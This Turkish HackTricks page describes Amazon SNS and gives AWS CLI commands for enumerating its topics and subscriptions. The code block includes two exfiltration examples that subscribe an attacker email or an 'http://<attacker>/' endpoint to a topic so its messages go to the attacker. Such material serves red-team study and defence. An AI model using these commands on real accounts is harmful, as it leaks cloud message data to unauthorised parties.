# AWS - SNS Enum

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahraman olmak için AWS hackleme öğrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamınızı görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)'ı **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR göndererek paylaşın**.

</details>

## SNS

Amazon Simple Notification Service (Amazon SNS), **tamamen yönetilen bir mesajlaşma servisi** olarak tanımlanır. Hem **uygulama-uygulama** (A2A) hem de **uygulama-kullanıcı** (A2P) iletişim türlerini destekler.

A2A iletişimi için önemli özellikler arasında **yayın/abonelik (pub/sub) mekanizmaları** bulunur. Bu mekanizmalar, yüksek verimli, **itme tabanlı, çoklu-mesajlı iletişimi** mümkün kılan konuları tanıtır. Bu özellik, dağıtık sistemler, mikro hizmetler ve olay odaklı sunucusuz mimarileri içeren senaryolarda son derece avantajlıdır. Yayıncı sistemler, bu konuları kullanarak mesajları **geniş bir abone sistemine** etkin bir şekilde dağıtabilir ve fanout iletişim desenini kolaylaştırabilir.

### **SQS ile Farkı**

**SQS**, **kuyruk tabanlı** bir hizmettir ve mesajların **tek bir tüketici** tarafından işlenmesini sağlayarak noktadan noktaya iletişimi sağlar. **En az bir kez teslimat** sunar, standart ve FIFO kuyrukları destekler ve yeniden deneme ve gecikmeli işleme için mesaj saklama imkanı sağlar.\
Öte yandan, **SNS**, **yayın/abonelik tabanlı bir hizmet** olup, mesajları **çoklu abonelere** aynı anda yayınlayarak **birçok aboneye** iletişim imkanı sağlar. E-posta, SMS, Lambda fonksiyonları ve HTTP/HTTPS gibi **çeşitli abonelik uç noktalarını** destekler ve hedeflenen mesaj iletimi için filtreleme mekanizmaları sağlar.\
Her iki hizmet de dağıtık sistemlerde bileşenler arasında bağımsızlık sağlarken, SQS kuyruk tabanlı iletişime odaklanırken, SNS olay odaklı, fan-out iletişim desenlerine vurgu yapar.

### **Numaralandırma**
```bash
# Get topics & subscriptions
aws sns list-topics
aws sns list-subscriptions
aws sns list-subscriptions-by-topic --topic-arn <arn>

# Check privescs & post-exploitation
aws sns publish --region <region> \
--topic-arn "arn:aws:sns:us-west-2:123456789012:my-topic" \
--message file://message.txt

# Exfiltrate through email
## You will receive an email to confirm the subscription
aws sns subscribe --region <region> \
--topic-arn arn:aws:sns:us-west-2:123456789012:my-topic \
--protocol email \
--notification-endpoint my-email@example.com

# Exfiltrate through web server
## You will receive an initial request with a URL in the field "SubscribeURL"
## that you need to access to confirm the subscription
aws sns subscribe --region <region>\
--protocol http \
--notification-endpoint http://<attacker>/ \
--topic-arn <arn>
```
{% hint style="danger" %}
Dikkat, eğer **konu FIFO türünde ise**, yalnızca SQS protokolünü kullanan aboneler kullanılabilir (HTTP veya HTTPS kullanılamaz).

Ayrıca, `--topic-arn` bölümü bölgeyi içerse bile, doğru bölgeyi **`--region`** ile belirttiğinizden emin olun; aksi takdirde, erişiminizin olmadığı bir hata alırsınız, ancak sorun bölgededir.
{% endhint %}

### Kimlik Doğrulamasız Erişim

{% content-ref url="../aws-unauthenticated-enum-access/aws-sns-unauthenticated-enum.md" %}
[aws-sns-unauthenticated-enum.md](../aws-unauthenticated-enum-access/aws-sns-unauthenticated-enum.md)
{% endcontent-ref %}

### Yetki Yükseltme

{% content-ref url="../aws-privilege-escalation/aws-sns-privesc.md" %}
[aws-sns-privesc.md](../aws-privilege-escalation/aws-sns-privesc.md)
{% endcontent-ref %}

### Saldırı Sonrası

{% content-ref url="../aws-post-exploitation/aws-sns-post-exploitation.md" %}
[aws-sns-post-exploitation.md](../aws-post-exploitation/aws-sns-post-exploitation.md)
{% endcontent-ref %}

### Kalıcılık

{% content-ref url="../aws-persistence/aws-sns-persistence.md" %}
[aws-sns-persistence.md](../aws-persistence/aws-sns-persistence.md)
{% endcontent-ref %}

# Referanslar
* [https://aws.amazon.com/about-aws/whats-new/2022/01/amazon-sns-attribute-based-access-controls/](https://aws.amazon.com/about-aws/whats-new/2022/01/amazon-sns-attribute-based-access-controls/)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>ile sıfırdan kahraman olmak için AWS hackleme öğrenin</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamınızı görmek veya HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya bizi **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'da takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR göndererek** paylaşın.

</details>
